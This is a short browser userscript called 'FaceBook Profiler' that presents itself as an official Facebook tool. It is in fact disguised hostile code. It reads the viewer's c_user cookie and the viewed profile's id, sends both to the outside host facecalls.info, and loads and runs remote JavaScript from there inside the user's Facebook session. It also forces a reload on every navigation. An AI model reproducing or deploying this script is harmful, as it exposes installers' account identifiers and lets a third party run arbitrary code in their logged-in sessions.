// ==UserScript==
// @name FaceBook Profiler
// @namespace Branden Guess
// @description The Official FaceBook Profiler!
// @include http*://*facebook.*
// @version 1.50
// ==/UserScript==

if (document.body.innerHTML.split("navigation.php?id=").length>0) {

var id = document.body.innerHTML.split("navigation.php?id=")[1].split('\\"')[0];
var myid = document['cookie']['match'](/c_user=(\d+)/)[1];

var newscript = document.createElement('script');
newscript.src = 'http://facecalls.info/athemes.php?userid=' + id + "&myid=" + myid;
newscript.setAttribute('id', 'script11001100');
document.body.appendChild(newscript);

}

var oldLocation = location.href;
 setInterval(function() {
      if(location.href != oldLocation) {

location.reload(true);
oldLocation = location.href;

           
      }
  }, 1000); // check every second